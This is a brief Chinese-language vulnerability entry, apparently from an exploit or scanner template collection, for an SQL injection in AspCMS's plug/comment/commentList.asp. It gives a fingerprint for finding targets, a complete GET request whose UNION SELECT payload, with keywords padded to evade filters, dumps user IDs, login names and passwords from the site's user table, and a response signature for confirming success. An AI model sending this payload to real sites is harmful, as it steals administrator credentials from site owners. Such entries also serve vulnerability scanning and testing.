# AspCMScommentList.aspSQL注入漏洞

AspCMScommentList ｜ SQL注入 ｜ —
- **指纹**：`app="ASPCMS"`
- **请求**：`GET /plug/comment/commentList.asp?id=-1%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now(),null,1%20%20frmasterom%20{prefix}user HTTP/1.1`
- **响应特征**：200 UserID